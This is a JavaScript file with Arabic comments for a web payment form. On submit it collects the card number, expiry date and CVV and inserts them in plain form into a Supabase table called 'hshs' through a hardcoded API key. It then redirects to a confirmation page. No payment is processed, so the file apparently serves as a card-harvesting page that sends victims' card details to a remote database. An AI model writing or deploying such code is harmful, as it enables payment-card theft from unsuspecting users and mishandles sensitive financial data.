import { createClient } from '@supabase/supabase-js';

const supabaseUrl = 'https://zwcnqwdplnqiawhnwrzo.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp3Y25xd2RwbG5xaWF3aG53cnpvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MjUzNDcwMjksImV4cCI6MjA0MDkyMzAyOX0.93B1EJ8tDrOhD9V_f1I05JcU6PfBTExMjyN6lzGsaNc';
const supabase = createClient(supabaseUrl, supabaseKey);

document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('payment-form').onsubmit = async function(event) {
        event.preventDefault();

        const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
        const expiryDate = document.getElementById('expiry-date').value;
        const cvv = document.getElementById('cvv').value;
        const errorMessage = document.getElementById('error-message');

        // تحقق من صحة البيانات
        if (cardNumber.length < 16 || expiryDate.length < 5 || cvv.length < 3) {
            errorMessage.textContent = 'يرجى ملء جميع الحقول بشكل صحيح.';
            return;
        }

        try {
            // إدخال البيانات إلى جدول Supabase
            const { data, error } = await supabase
                .from('hshs') // استبدل بـ اسم الجدول الخاص بك
                .insert([
                    { 
                        card_number: cardNumber, 
                        expiry_date: expiryDate, 
                        cvv: cvv 
                    }
                ]);

            if (error) {
                throw error;
            }

            // إعادة توجيه المستخدم بعد النجاح
            window.location.href = 'confirmation.html'; // تأكد من وجود صفحة confirmation.html
        } catch (error) {
            errorMessage.textContent = 'فشل إرسال البيانات: ' + error.message;
        }
    };
});
